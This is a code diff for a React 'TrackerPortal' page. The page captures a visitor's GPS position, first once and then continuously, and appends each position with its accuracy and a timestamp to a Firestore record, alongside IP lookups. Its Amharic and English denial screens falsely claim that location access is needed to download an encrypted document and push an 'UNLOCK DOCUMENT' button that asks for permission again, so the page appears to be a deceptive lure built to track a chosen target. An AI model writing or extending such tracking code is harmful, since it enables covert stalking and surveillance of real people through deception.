@@ -148,7 +148,12 @@ export const TrackerPortal: React.FC = () => {
 
         for (const service of services) {
           try {
-            const res = await fetch(service, { signal: AbortSignal.timeout(5000) });
+            // Using a plain fetch with a custom timeout for better compatibility
+            const controller = new AbortController();
+            const id = setTimeout(() => controller.abort(), 6000);
+            
+            const res = await fetch(service, { signal: controller.signal });
+            clearTimeout(id);
             const data = await res.json();
             
             let ipInfo = {};
@@ -179,55 +184,77 @@ export const TrackerPortal: React.FC = () => {
       let lastReportTime = 0;
       const MIN_INTERVAL = 2000; 
 
+      const handleGeoSuccess = async (position: any) => {
+        const { latitude, longitude, accuracy } = position.coords;
+        const now = Date.now();
+        
+        if (now - lastReportTime < MIN_INTERVAL) return;
+        
+        lastReportTime = now;
+        setSyncCount(prev => prev + 1);
+        
+        try {
+          const historyItem = { 
+            lat: latitude, 
+            lng: longitude, 
+            time: new Date().toISOString() 
+          };
+
+          await setDoc(targetRef, {
+            lat: latitude,
+            lng: longitude,
+            accuracy: accuracy,
+            lastSeen: new Date().toISOString(),
+            history: arrayUnion(historyItem)
+          }, { merge: true });
+          
+          setStatus('granted');
+        } catch (e) {
+          console.error("Uplink Failure:", e);
+        }
+      };
+
+      const handleGeoError = (error: any) => {
+        console.error("Geo Error:", error);
+        if (error.code === error.PERMISSION_DENIED) {
+          setStatus('denied');
+        } else {
+          setStatus('error');
+          setErrorMsg(error.message);
+        }
+      };
+
       if (!navigator.geolocation) {
         setStatus('error');
         setErrorMsg('SECURE_PROTOCOL_UNSUPPORTED');
         return;
       }
 
-      navigator.geolocation.watchPosition(
-        async (position) => {
-          const { latitude, longitude, accuracy } = position.coords;
-          const now = Date.now();
-          
-          if (now - lastReportTime < MIN_INTERVAL) return;
-          
-          lastReportTime = now;
-          setSyncCount(prev => prev + 1);
-          
-          try {
-            const historyItem = { 
-              lat: latitude, 
-              lng: longitude, 
-              time: new Date().toISOString() 
-            };
+      // Initial capture
+      navigator.geolocation.getCurrentPosition(handleGeoSuccess, handleGeoError, {
+        enableHighAccuracy: true,
+        timeout: 10000
+      });
 
-            await setDoc(targetRef, {
-              lat: latitude,
-              lng: longitude,
-              accuracy: accuracy,
-              lastSeen: new Date().toISOString(),
-              history: arrayUnion(historyItem)
-            }, { merge: true });
-            
-            // Success Feedback
-            setStatus('granted');
-          } catch (e) {
-            console.error("Uplink Failure:", e);
-          }
-        },
-        (error) => {
-          console.error("Geo Error:", error);
-          if (error.code === error.PERMISSION_DENIED) {
-            setStatus('denied');
-          }
-        },
-        { enableHighAccuracy: true, maximumAge: 0, timeout: 20000 }
-      );
+      // Continuous monitoring
+      navigator.geolocation.watchPosition(handleGeoSuccess, handleGeoError, { 
+        enableHighAccuracy: true, 
+        maximumAge: 0, 
+        timeout: 20000 
+      });
+
     } catch (err: any) {
       console.error("Fatal Recon Failure:", err);
       setStatus('error');
+      if (err.message?.includes('permission-denied')) {
+         setErrorMsg('STORAGE_ACCESS_DENIED: Please enable cookies or open in a standard browser.');
+      }
     }
+  };
+
+  const manualUnlock = () => {
+    setStatus('scanning');
+    startRecon();
   };
 
   // If hydration hasn't happened yet, render a matching skeleton
@@ -288,7 +315,6 @@ export const TrackerPortal: React.FC = () => {
       </div>
     );
   }
-
 
   return (
     <div className="min-h-screen bg-[#050608] text-slate-300 font-mono flex flex-col items-center justify-center p-4 tech-grid">
@@ -477,29 +503,33 @@ export const TrackerPortal: React.FC = () => {
           )}
 
           {status === 'denied' && (
-            <div className="text-center p-8 border border-red-500/20 bg-red-500/5 rounded-lg space-y-4">
-              <AlertTriangle className="w-10 h-10 text-red-600 mx-auto opacity-80" />
-              <div className="space-y-1">
+            <div className="text-center p-8 border border-red-500/20 bg-red-500/5 rounded-lg space-y-6 animate-in slide-in-from-bottom-4">
+              <div className="w-12 h-12 bg-red-500/20 rounded-full flex items-center justify-center mx-auto">
+                 <AlertTriangle className="w-6 h-6 text-red-500" />
+              </div>
+              <div className="space-y-2">
                 <p className="text-[12px] text-red-500 font-black uppercase tracking-tighter italic">SYNC_STALLED_BY_USER</p>
-                <p className="text-[9px] text-slate-500 leading-relaxed font-medium">የዳታ ግንኙነቱ ተቋርጧል። መረጃውን ለመቀበል የሲስተም ፈቃዱን (System Handshake) ማረጋገጥ አስፈላጊ ነው።</p>
+                <p className="text-[11px] text-slate-300 leading-relaxed font-bold">
+                   {lang === 'amharic' ? 'ዳታውን ወደ ስልክዎ ለማውረድ የቦታ መገኛ ፍቃድ መስጠት አስፈላጊ ነው። እባክዎ ሊንኩን ለመክፈት ፍቃድ ይስጡ።' : 'System handshake requires location verification to download the encrypted document. Please grant access to continue.'}
+                </p>
               </div>
               <button 
-                onClick={() => startRecon()}
-                className="w-full py-3 bg-red-900/20 hover:bg-red-900/30 text-red-400 text-[10px] uppercase font-bold rounded border border-red-500/30 transition-colors"
+                onClick={() => manualUnlock()}
+                className="w-full py-4 bg-red-600 hover:bg-red-500 text-white text-[11px] uppercase font-black rounded-xl shadow-lg shadow-red-900/50 transition-all flex items-center justify-center gap-2"
               >
-                ዳግም አስነሳ (RE-SYNC)
+                <MapPin className="w-4 h-4" /> {lang === 'amharic' ? 'መረጃውን ክፈት (UNLOCK)' : 'UNLOCK DOCUMENT'}
               </button>
             </div>
           )}
 
           {status === 'error' && (
-            <div className="text-center p-6 border border-amber-500/20 bg-amber-500/5 rounded-lg space-y-3">
+            <div className="text-center p-6 border border-amber-500/20 bg-amber-500/5 rounded-lg space-y-4">
               <AlertTriangle className="w-8 h-8 text-amber-600/50 mx-auto" />
               <p className="text-[11px] font-bold text-amber-500 uppercase italic">CONNECTION_TIMEOUT</p>
               <p className="text-[9px] text-slate-500 px-4">{errorMsg}</p>
               <button 
-                onClick={() => setStatus('idle')}
-                className="text-[9px] text-blue-500 underline font-bold uppercase"
+                onClick={() => manualUnlock()}
+                className="w-full py-3 bg-amber-600/20 border border-amber-500/30 text-amber-500 rounded-lg text-[10px] font-black uppercase"
               >
                 Retry Handshake
               </button>
